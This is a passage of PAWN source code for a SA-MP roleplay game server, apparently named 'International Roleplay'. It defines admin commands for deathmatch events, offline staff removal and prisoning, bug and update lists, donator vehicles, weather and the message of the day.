	  NoAuth(playerid);
   }
   return 1;
}
IRP:eventhelp(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
       SendClientMessage(playerid, COLOR_YELLOW, "** [EVENT Commands]: {FFFFFF}/editevent /announceevent /lockevent /startevent /endevent /countdown /eban");
       return 1;
	}
	else
	{
	   NoAuth(playerid);
	}
	return 1;
}
IRP:eban(playerid, var[])
{
    new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
 	{
    	if(sscanf(var, "us[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /eban [playerid] [reason]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(Player[playerid][pAdmin] >= Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do any action against this player.");
    	format(string, sizeof(string), "AdmCmd: %s has been banned from joining any future events by %s, reason: %s", GetName(user), GetName(playerid), var);
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	format(string, sizeof(string), "AdmCmd: %s has been banned by %s (%s), reason: %s", GetName(user), GetName(playerid) , RPIP(user), var);
    	Log("Log/Admins/eban.log", string);
    	// Banning
    	Player[user][pEBanned] = 1;
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:countdown(playerid, var[])
{
	if(Player[playerid][pAdmin] >= 4)
    {
		SetTimer("Three", 1000, 0);
		SetTimer("Two", 2000, 0);
		SetTimer("One", 3000, 0);
		SetTimer("GoGoGo", 4000, 0);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
	}
	return 1;
}

IRP:editevent(playerid, var[])
{
	new string[128], option[32], amount;
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(sscanf(var, "s[32]", option))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editevent [option]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: position | weapon | health | armor | type");
		return 1;
	}
	if(!strcmp(option, "position", true))
	{
	    GetPlayerPos(playerid, ePos[0], ePos[1], ePos[2]);
		eInt = GetPlayerInterior(playerid);
		eVW = GetPlayerVirtualWorld(playerid);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have set the event's position.");
		return 1;
	}
	else if(!strcmp(option, "weapon", true, 6))
	{
	    new wep;
	    if(sscanf(var, "s[8]ii", option, wep, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editevent weapon [slot] [weaponid]");
		if(wep < 1 || wep > 3) return SendClientMessage(playerid, COLOR_GRAD2, "Weapon slots are between 1 and 3.");
		if(amount < 0 || amount > 46 || amount == 19 || amount == 20 || amount == 21) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid weapon id.");
	    switch(wep)
	    {
	        case 1: EventWep[0] = amount;
	        case 2: EventWep[1] = amount;
	        case 3: EventWep[2] = amount;
	    }
	    format(string, sizeof(string), " You have set weapon slot %d's id to %d.", wep, amount);
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	}
	else if(!strcmp(option, "health", true, 6))
	{
	    if(sscanf(var, "s[8]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editevent health [amount]");
	    EventHealth = amount;
	    format(string, sizeof(string), " You have set the event's health to %d.", amount);
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

	}
	else if(!strcmp(option, "armor", true, 5))
	{
	    if(sscanf(var, "s[8]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editevent armor [amount]");
	    EventArmor = amount;
	    format(string, sizeof(string), " You have set the event's armor to %d.", amount);
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

	}
	else if(!strcmp(option, "type", true, 5))
	{
	    return i_eventtypes(playerid, var);
	}
	return 1;
}
IRP:eventtypes(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
    if(EventType == 0 || EventType == 2)
   	{
		EventType = 1;
	 	SendClientMessage(playerid, COLOR_WHITE, "You've adjusted the event type to Deathmatch.");
	}
    else if(EventType == 1)
   	{
        EventType = 2;
	 	SendClientMessage(playerid, COLOR_WHITE, "You've adjusted the event type to Team-Deathmatch.");
   	}
	return 1;
}
IRP:startevent(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(!EventOn) return SendClientMessage(playerid, COLOR_GRAD2, "There's no current event happening.");
	if(!EventLocked) return SendClientMessage(playerid, COLOR_GRAD2, "The event must be locked before it starts.");
	if(EventOn == 2) return SendClientMessage(playerid, COLOR_GRAD2, "The event has already started.");
    SendClientMessageToAll(COLOR_LIGHTRED, "** You've recieved the Event Equipments, Wait till the countdown then start to shoot.");
    EventOn = 2;
	foreach(Player, i)
	{
	    if(Event[i])
	    {
	        GivePlayerWeapon(i, EventWep[0], 999999);
	        GivePlayerWeapon(i, EventWep[1], 999999);
	        GivePlayerWeapon(i, EventWep[2], 999999);
	        SetPlayerHealth(i, EventHealth);
	        SetPlayerArmour(i, EventArmor);
	    }
	}
	return 1;
}

IRP:lockevent(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(!EventOn) return SendClientMessage(playerid, COLOR_GRAD2, "There's no current event happening.");
	if(EventOn == 2) return SendClientMessage(playerid, COLOR_GRAD2, "The event has already started.");
	if(!EventLocked)
	{
	    SendClientMessageToAll(COLOR_LIGHTRED, "** The event has been locked.");
	    EventLocked = 1;
    }
    else
    {
	    SendClientMessageToAll(COLOR_LIGHTRED, "** The event has been unlocked.");
	    EventLocked = 0;
    }
	return 1;
}

IRP:announceevent(playerid, var[])
{
	new string[256], gender[30];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(EventType == 1) format(gender, sizeof(gender), "Deathmatch");
	else if(EventType == 2) format(gender, sizeof(gender), "Team-Deathmatch");
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(ePos[0] == 0 && ePos[1] == 0 && ePos[2] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "You have to at least set the event's position before opening it.");
	if(EventOn) return SendClientMessage(playerid, COLOR_GRAD2, "The event has been announced already.");
	if(EventOn == 2) return SendClientMessage(playerid, COLOR_GRAD2, "The event has already started.");
	EventOn = 1;
	format(string, sizeof(string), "** %s %s has created a {00FF00}%s{FF6347} event, /joinevent to join it.", RPALN(playerid), GetName(playerid), gender, var);
	SendClientMessageToAll(COLOR_LIGHTRED, string);
	return 1;
}

IRP:endevent(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(!EventOn) return SendClientMessage(playerid, COLOR_GRAD2, "There's no current event happening.");
    SendClientMessageToAll(COLOR_LIGHTRED, "** The event has been end.");
	foreach(Player, i)
	{
	    if(Event[i])
	    {
	        GunsBeingRemoved[i] = 1;
		    ResetPlayerWeapons(i);
		    GunsBeingRemoved[playerid] = 1;
		    SetPlayerPos(i, Player[i][pX], Player[i][pY], Player[i][pZ]);
			SetPlayerInterior(i, Player[i][pInt]);
			SetPlayerVirtualWorld(i, Player[i][pVW]);
			SetPlayerHealth(i, Player[i][pHealth]);
			SetPlayerArmour(i, Player[i][pArmor]);
			for(new w = 0; w < 13; w++)
			{
			    GiveZamoraWeapon(i, Player[i][pWeapon][w], Player[i][pWeaponAmmo][w]);
			}
			Event[i] = 0;
		}
		EventOn = 0; EventLocked = 0;
		ePos[0] = 0; ePos[1] = 0; ePos[2] = 0; EventWep[0] = 0; EventWep[1] = 0; EventWep[2] = 0;
		eInt = 0; eVW = 0; EventHealth = 0; EventArmor = 0;
	}

	return 1;
}

IRP:oremoveadmin(playerid, var[])
{
    new user[32], string[128], file[32];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 100000) return NoAuth(playerid);
	if(sscanf(var, "s[32]s[256]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /oremoveadmin [playername] [confirm]");
	if(RPIDFN(user) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GRAD2, "The player is online, Use /makeadmin instead.");
	format(file, sizeof(file), "Accounts/%s.ini", user);
	if(!dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "Player name not found.");
	if(Player[playerid][pAdmin] < dini_Int(file, "Admin")) return SendClientMessage(playerid, COLOR_GRAD2, "Player has a higher admin level than you.");
	format(string, sizeof(string), "AdminWarning: %s has been removed from Administrators team by %s", user, GetName(playerid));
    SendAdminMessage(COLOR_ADMWARN, string);
	// Removing
	dini_IntSet(file, "Admin", 0);
	dini_IntSet(file, "AdminAccount", 0);
	return 1;
}
IRP:oremovetester(playerid, var[])
{
    new user[32], string[128], file[32];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 1337 ) return NoAuth(playerid);
	if(sscanf(var, "s[32]s[256]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /oremovetester [playername] [confirm]");
	if(RPIDFN(user) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GRAD2, "The player is online, Use /maketester instead.");
	format(file, sizeof(file), "Accounts/%s.ini", user);
	if(!dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "Player name not found.");
	if(Player[playerid][pMapper] < dini_Int(file, "Mapper")) return SendClientMessage(playerid, COLOR_GRAD2, "Player is a higher tester than you");
	format(string, sizeof(string), "HelperWarning: %s has been removed from the tester team by %s", user, GetName(playerid));
	SendTesterMessage(COLOR_ADMWARN, string);
	format(string, sizeof(string), "AdminWarning: %s has been removed from the tester team by %s", user, GetName(playerid));
    SendAdminMessage(COLOR_ADMWARN, string);
	// Removing
	dini_IntSet(file, "Tester", 0);
	return 1;
}
IRP:oremovemapper(playerid, var[])
{
    new user[32], string[128], file[32];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 100000) return NoAuth(playerid);
	if(sscanf(var, "s[32]s[256]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /oremovemapper [playername] [confirm]");
	if(RPIDFN(user) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GRAD2, "The player is online, Use /makemapper instead.");
	format(file, sizeof(file), "Accounts/%s.ini", user);
	if(!dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "Player name not found.");
	if(Player[playerid][pMapper] < dini_Int(file, "Mapper")) return SendClientMessage(playerid, COLOR_GRAD2, "Player is a higher mapper than you");
	format(string, sizeof(string), "AdminWarning: %s has been removed from the mapper team by %s", user, GetName(playerid));
	SendMapperMessage(COLOR_ADMWARN, string);
	format(string, sizeof(string), "AdminWarning: %s has been removed from the mapper team by %s", user, GetName(playerid));
    SendAdminMessage(COLOR_ADMWARN, string);
	// Removing
	dini_IntSet(file, "Mapper", 0);
	return 1;
}
IRP:oremovehelper(playerid, var[])
{
    new user[32], string[128], file[32];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 100000 || Player[playerid][pHelper] >= 5)
	{
    	if(sscanf(var, "s[32]s[256]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /oremovehelper [playername] [confirm]");
    	if(RPIDFN(user) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GRAD2, "The player is online, Use /firehelper instead.");
    	format(file, sizeof(file), "Accounts/%s.ini", user);
    	if(!dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "Player name not found.");
    	if(Player[playerid][pHelper] < dini_Int(file, "Helper")) return SendClientMessage(playerid, COLOR_GRAD2, "Player has a higher helper level than you.");
    	format(string, sizeof(string), "HelperWarning: %s has been removed from the helpers team by %s", user, GetName(playerid));
    	SendHelperMessage(COLOR_ADMWARN, string);
    	format(string, sizeof(string), "AdminWarning: %s has been removed from the helpers team by %s", user, GetName(playerid));
        SendAdminMessage(COLOR_ADMWARN, string);
    	// Removing
    	dini_IntSet(file, "Helper", 0);
    }
	return 1;
}
IRP:oremovemod(playerid, var[])
{
    new user[32], string[128], file[32];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] == 100000)
	{
    	if(sscanf(var, "s[32]s[256]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /oremovemod [playername] [confirm]");
    	if(RPIDFN(user) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GRAD2, "The player is online, Use /firemod instead.");
    	format(file, sizeof(file), "Accounts/%s.ini", user);
    	if(!dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "Player name not found.");
    	format(string, sizeof(string), "AdminWarning: %s has been removed from the moderators team by %s", user, GetName(playerid));
        SendAdminMessage(COLOR_ADMWARN, string);
    	// Removing
    	dini_IntSet(file, "Moderator", 0);
    }
	return 1;
}

IRP:oremoveleadership(playerid, var[])
{
    new user[32], string[128], file[32];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFacMod]) return NoAuth(playerid);
	if(sscanf(var, "s[32]s[256]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /oremoveleadership [playername] [confirm]");
	if(RPIDFN(user) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GRAD2, "The player is online, Use /makeleader instead.");
	format(file, sizeof(file), "Accounts/%s.ini", user);
	if(!dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "Player name not found.");
	format(string, sizeof(string), "AdminWarning: %s has been kicked out of his leadership by %s", user, GetName(playerid));
    SendAdminMessage(COLOR_ADMWARN, string);
	// Removing
	dini_IntSet(file, "Fac", 0);
	dini_IntSet(file, "FacLeader", 0);
	dini_IntSet(file, "FacRank", 0);
	dini_IntSet(file, "FacDiv", 0);
	dini_IntSet(file, "FacDivLeader", 0);
	return 1;
}
IRP:oprison(playerid, var[])
{
    new user[32], string[128], file[32], time;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
	if(sscanf(var, "s[32]is[128]", user, time, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /oprison [playername] [time] [reason]");
	if(RPIDFN(user) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GRAD2, "Player is connected to the server, use /prison instead.");
	format(file, sizeof(file), "Accounts/%s.ini", user);
	if(!dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "Player name not found.");
	if(Player[playerid][pAdmin] < dini_Int(file, "Admin")) return SendClientMessage(playerid, COLOR_GRAD2, "Player has a higher admin level than you.");
	format(string, sizeof(string), "AdmCmd: %s has been offline-prisoned by %s, reason: %s", user, GetName(playerid), var);
	SendClientMessageToAll(COLOR_LIGHTRED, string);
	format(string, sizeof(string), "AdmCmd: %s has been offline-prisoned by %s, reason: %s", user, GetName(playerid) , var);
	// Prisoning
	dini_IntSet(file, "pJail", 1);
	// Prisonreason
	dini_Set(file, "pJailReason", var);
	dini_Set(file, "pJailBy", GetName(playerid));
	dini_IntSet(file, "pJailTime", time);
	return 1;
}
IRP:bugs(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	new string[128], File: file = fopen("bug.cfg", io_read), idx=1;
   	if(Player[playerid][pAdmin] >= 4 || Player[playerid][pTester] >= 1)
	{
    	SendClientMessage(playerid, COLOR_INT, "|______________ International Roleplay Bugs _____________|");
    	while(fread(file, string))
    	{
    	    format(string, sizeof(string), "%s", string);
    	    SendClientMessage(playerid, COLOR_WHITE, string);
    	    idx ++;
    	}
    	fclose(file);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:updates(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	new string[128], File: file = fopen("updates.cfg", io_read), idx=1;
	if(Player[playerid][pLevel])
	{
    	SendClientMessage(playerid, COLOR_INT, "|______________ International Roleplay Updates _____________|");
    	while(fread(file, string))
    	{
    	    format(string, sizeof(string), "%s", string);
    	    SendClientMessage(playerid, COLOR_WHITE, string);
    	    idx ++;
    	}
    	fclose(file);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:tod(playerid, var[])
{
	new string[128], input;
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
    	if(sscanf(var, "i", input)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tod [hour]");
    	if(input > 23) return SendClientMessage(playerid, COLOR_GRAD2, "Hours are between 0 and 23.");
    	gettime(thour, tmin, tsec);
    	thour = input;
    	SetWorldTime(input);
    	format(string, sizeof(string), "AdminWarning: %s has set the time to %d.", GetName(playerid), input);
    	SendAdminMessage(COLOR_ADMWARN, string);
    }
	return 1;
}
IRP:donatorcar(playerid, var[])
{
	new user, slot, carid, string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
    if(sscanf(var, "udd", user, slot, carid))
    {
       SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /donatorcar [playerid] [slot] [carid]");
       return 1;
   	}
    if(Player[playerid][pAdmin] >= 1337)
    {
    	new Float:X, Float:Y, Float:Z;
     	GetPlayerPos(user, X, Y, Z);
     	if(!Logged(user)) return NoLoginB(playerid);
     	if(slot == 1)
     	{
         	Player[user][pVeh] = CreateVehicle(carid, X,Y,Z,272.3125,0,0,1200);
            SetVehicleParamsEx(Player[user][pVeh], 0, 0, 0, 1, 0, 0, 0);
            Player[user][vLocked] = 1;
            Player[user][vModel] = carid;
        	GetVehiclePos(Player[user][pVeh], Player[user][vX], Player[user][vY], Player[user][vZ]);
        	GetVehicleZAngle(Player[user][pVeh], Player[user][vA]);
        	Player[user][vC1] = 0;
        	Player[user][vC2] = 0;
        	PutPlayerInVehicle(user, Player[user][pVeh], 0);
        	format(string, sizeof(string), "AdminWarning: %s has gifted %s a %s.", GetName(playerid), GetName(user), RVN(GetVehicleModel(Player[user][pVeh])));
        	SendAdminMessage(COLOR_ADMWARN, string);
        }
    	else if(slot == 2)
     	{
     		Player[user][pVVeh] = CreateVehicle(carid, X,Y,Z,272.3125,0,0,1200);
        	SetVehicleParamsEx(Player[user][pVVeh], 0, 0, 0, 1, 0, 0, 0);
         	Player[user][vVLocked] = 1;
         	Player[user][vVModel] = carid;
    		GetVehiclePos(Player[user][pVVeh], Player[user][vVX], Player[user][vVY], Player[user][vVZ]);
    		GetVehicleZAngle(Player[user][pVVeh], Player[user][vVA]);
    		Player[user][vVC1] = 0;
    		Player[user][vVC2] = 0;
    		PutPlayerInVehicle(user, Player[user][pVVeh], 0);
    		format(string, sizeof(string), "AdminWarning: %s has gifted %s a %s.", GetName(playerid), GetName(user), RVN(GetVehicleModel(Player[user][pVVeh])));
    		SendAdminMessage(COLOR_ADMWARN, string);
    		return 1;
     	}
        else if(slot == 3)
     	{
     		Player[user][pVVVeh] = CreateVehicle(carid, X,Y,Z,272.3125,0,0,1200);
        	SetVehicleParamsEx(Player[user][pVVVeh], 0, 0, 0, 1, 0, 0, 0);
         	Player[user][vVVLocked] = 1;
         	Player[user][vVVModel] = carid;
    		GetVehiclePos(Player[user][pVVVeh], Player[user][vVVX], Player[user][vVVY], Player[user][vVVZ]);
    		GetVehicleZAngle(Player[user][pVVVeh], Player[user][vVVA]);
    		Player[user][vVVC1] = 0;
    		Player[user][vVVC2] = 0;
    		PutPlayerInVehicle(user, Player[user][pVVVeh], 0);
    		format(string, sizeof(string), "AdminWarning: %s has gifted %s a %s.", GetName(playerid), GetName(user), RVN(GetVehicleModel(Player[user][pVVVeh])));
    		SendAdminMessage(COLOR_ADMWARN, string);
    		return 1;
     	}
     	else if(slot == 4)
     	{
     		Player[user][pVVVVeh] = CreateVehicle(carid, X,Y,Z,272.3125,0,0,1200);
        	SetVehicleParamsEx(Player[user][pVVVVeh], 0, 0, 0, 1, 0, 0, 0);
         	Player[user][vVVVLocked] = 1;
         	Player[user][vVVVModel] = carid;
    		GetVehiclePos(Player[user][pVVVVeh], Player[user][vVVVX], Player[user][vVVVY], Player[user][vVVVZ]);
    		GetVehicleZAngle(Player[user][pVVVVeh], Player[user][vVVVA]);
    		Player[user][vVVVC1] = 0;
    		Player[user][vVVVC2] = 0;
    		PutPlayerInVehicle(user, Player[user][pVVVVeh], 0);
    		format(string, sizeof(string), "AdminWarning: %s has gifted %s a %s.", GetName(playerid), GetName(user), RVN(GetVehicleModel(Player[user][pVVVVeh])));
    		SendAdminMessage(COLOR_ADMWARN, string);
    		return 1;
     	}
     	if(Player[user][vModel] && Player[user][vVModel] && Player[user][vVVModel] && Player[user][vVVVModel])
    	{
    		format(string, sizeof(string), "That player already owns vehicles ID %d, %d, %d, and %d.", Player[user][pVeh], Player[user][pVVeh], Player[user][pVVVeh], Player[user][pVVVVeh]);
    		SendClientMessage(playerid, COLOR_GRAD2, string);
     		return 1;
    	}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:healall(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
        foreach(Player, i)
        {
           if(Logged(i))
           {
            	SetPlayerHealth(i, 100);
            	SetPlayerArmour(i, 100);
           }
        }
    	format(string, sizeof(string), "AdmCmd: %s has healed everyone online.", GetName(playerid));
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	Log("Log/Admins/heal.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
    return 1;
}
IRP:addbug(playerid, var[])
{
	new type;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pTester] >= 1)
   	{
    	if(sscanf(var, "is[128]", type, var))
		{
		    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /addbug [type] [text]");
		    SendClientMessage(playerid, COLOR_GRAD2, "** [TYPES]: 1 = Need Fix ASAP / 2 = Need Fix / 3 = Minor Bug");
		    return 1;
		}
    	if(AntiAdv(playerid, var)) return 1;
    	if(type < 1 || type > 4) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an inavlid update type.");
    	if(strlen(var) > 128) return SendClientMessage(playerid, COLOR_GRAD2, "Maximum characters limit is 128.");
    	new File: file = fopen("bug.cfg", io_append), string[128];
    	if(type == 1)
    	{
        	format(string, sizeof(string), "{088A08}[Need Fix ASAP]{FFFFFF}: %s\r\n", var);
        	fwrite(file, string);
        	fclose(file);
        }
        else if(type == 2)
    	{
        	format(string, sizeof(string), "{B40404}[Need Fix]{FFFFFF}: %s\r\n", var);
        	fwrite(file, string);
        	fclose(file);
        }
        else if(type == 3)
    	{
        	format(string, sizeof(string), "{FFFF00}[Minor Bug]{FFFFFF}: %s\r\n", var);
        	fwrite(file, string);
        	fclose(file);
        }

        format(string, sizeof(string), "AdminWarning: %s has added a bug in the bug list", GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	SendTesterMessage(COLOR_ADMWARN, string);
    	Log("Log/Admins/bugs.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
   	return 1;
}
IRP:addupdate(playerid, var[])
{
	new type;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 1338)
   	{
    	if(sscanf(var, "is[128]", type, var))
		{
		    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /addupdate [type] [text]");
		    SendClientMessage(playerid, COLOR_GRAD2, "** [TYPES]: 1 = Implemented / 2 = BugFix / 3 = Need GMX / 4 = Update");
		    return 1;
		}
    	if(AntiAdv(playerid, var)) return 1;
    	if(type < 1 || type > 4) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an inavlid update type.");
    	if(strlen(var) > 128) return SendClientMessage(playerid, COLOR_GRAD2, "Maximum characters limit is 128.");
    	new File: file = fopen("updates.cfg", io_append), string[128];
    	if(type == 1)
    	{
        	format(string, sizeof(string), "{088A08}[Implemented]{FFFFFF}: %s\r\n", var);
        	fwrite(file, string);
        	fclose(file);
        }
        else if(type == 2)
    	{
        	format(string, sizeof(string), "{B40404}[BugFix]{FFFFFF}: %s\r\n", var);
        	fwrite(file, string);
        	fclose(file);
        }
        else if(type == 3)
    	{
        	format(string, sizeof(string), "{FFFF00}[GMXNeeded]{FFFFFF}: %s\r\n", var);
        	fwrite(file, string);
        	fclose(file);
        }
        else if(type == 4)
    	{
        	format(string, sizeof(string), "{DBA901}[Updated]{FFFFFF}: %s\r\n", var);
        	fwrite(file, string);
        	fclose(file);
        }
        format(string, sizeof(string), "AdminWarning: %s has added an update in the updating list", GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/updates.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
   	return 1;
}
IRP:addtupdate(playerid, var[])
{
    new string[128], update[256], option[32];
    if(Player[playerid][pAdmin] >= 1338)
    {
       if(sscanf(var, "s[32]s[256]", option, update))
	   {
	      SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /addtupdate [1-5] [update]");
          return 1;
       }
       if(!strcmp(option, "1", true))
   	   {
           if(AntiAdv(playerid, var)) return 1;
       	   format(UPDATE1, sizeof(UPDATE1), "%s", update);
   	   	   format(string, sizeof(string), "AdminWarning: %s has added a TextDraw update 1: %s.", GetName(playerid), update);
   	   	   SendAdminMessage(COLOR_ADMWARN,  string);
   	   }
   	   if(!strcmp(option, "2", true))
   	   {
           if(AntiAdv(playerid, var)) return 1;
       	   format(UPDATE2, sizeof(UPDATE2), "%s", update);
   	   	   format(string, sizeof(string), "AdminWarning: %s has added a TextDraw update 2: %s.", GetName(playerid), update);
   	   	   SendAdminMessage(COLOR_ADMWARN,  string);
   	   }
   	   if(!strcmp(option, "3", true))
   	   {
           if(AntiAdv(playerid, var)) return 1;
       	   format(UPDATE3, sizeof(UPDATE3), "%s", update);
   	   	   format(string, sizeof(string), "AdminWarning: %s has added a TextDraw update 3: %s.", GetName(playerid), update);
   	   	   SendAdminMessage(COLOR_ADMWARN,  string);
   	   }
   	   if(!strcmp(option, "4", true))
   	   {
           if(AntiAdv(playerid, var)) return 1;
       	   format(UPDATE4, sizeof(UPDATE4), "%s", update);
   	   	   format(string, sizeof(string), "AdminWarning: %s has added a TextDraw update 4: %s.", GetName(playerid), update);
   	   	   SendAdminMessage(COLOR_ADMWARN,  string);
   	   }
   	   if(!strcmp(option, "5", true))
   	   {
           if(AntiAdv(playerid, var)) return 1;
       	   format(UPDATE5, sizeof(UPDATE5), "%s", update);
   	   	   format(string, sizeof(string), "AdminWarning: %s has added a TextDraw update 5: %s.", GetName(playerid), update);
   	   	   SendAdminMessage(COLOR_ADMWARN,  string);
   	   }
   	   Log("Log/Admins/tupdate.log", string);
   	}
   	else
   	{
	   NoAuth(playerid);
	}
    return 1;
}
IRP:setweather(playerid, var[])
{
	new string[128], input;
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "i", input)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /setweather [weather id]");
    	if(input > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Weather id's are between 0-2000");
    	SetWeather(input);
    	format(string, sizeof(string), "AdminWarning: %s has set the weather to %d.", GetName(playerid), input);
    	SendAdminMessage(COLOR_ADMWARN, string);
    }
	return 1;
}
IRP:deletebug(playerid, var[])
{
	new line;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pTester] >= 1)
	{
     	if(sscanf(var, "i", line)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deletebug [bugid]");
    	if(line < 1) return SendClientMessage(playerid, COLOR_GRAD2, "** You've entered an invalid bug id.");
    	new string[128];
    	fdeleteline("bug.cfg", line);
    	format(string, sizeof(string), "AdminWarning: %s has removed a bug from the bug list.", GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	SendTesterMessage(COLOR_ADMWARN, string);
    	Log("Log/Admins/bugs.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:removeupdate(playerid, var[])
{
	new line;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1338)
	{
     	if(sscanf(var, "i", line)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /removeupdate [updateid]");
    	if(line < 1) return SendClientMessage(playerid, COLOR_GRAD2, "** You've entered an invalid update id.");
    	new string[128];
    	fdeleteline("updates.cfg", line);
    	format(string, sizeof(string), "AdminWarning: %s has removed an update from the update list.", GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/updates.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:motd(playerid, var[])
{
    new string[128], motd[128], option[32];
    if(Player[playerid][pAdmin] == 100000)
    {
       if(sscanf(var, "s[32]s[128]", option, motd))
	   {
	      SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /motd [option] [motd]");
          SendClientMessage(playerid, COLOR_WHITE, "** [OPTIONS]: Server - Admin");
          return 1;
       }
       if(!strcmp(option, "server", true))
   	   {
           if(AntiAdv(playerid, var)) return 1;
       	   format(SMOTD, sizeof(SMOTD), "%s", motd);
      	   TextDrawSetString(MOTDDraw, SMOTD);
   	   	   format(string, sizeof(string), "AdminWarning: %s has changed the global motd to %s.", GetName(playerid), motd);
   	   	   SendAdminMessage(COLOR_ADMWARN,  string);
   	   }
   	   else if(!strcmp(option, "admin", true))
       {
           if(AntiAdv(playerid, var)) return 1;
